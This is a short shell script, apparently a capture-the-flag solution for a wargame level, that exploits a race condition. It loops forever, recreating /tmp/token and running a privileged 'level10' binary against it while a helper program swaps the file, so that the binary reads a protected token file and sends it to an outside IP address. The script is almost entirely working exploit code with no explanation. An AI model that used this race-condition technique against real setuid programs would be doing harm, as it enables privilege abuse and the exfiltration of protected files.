#!/bin/sh

while [ 1 ]
do 
        rm /tmp/token
        touch /tmp/token
        /home/user/level10/level10 /tmp/token 10.12.239.137 &
        ./symbolic-link /tmp/token
done
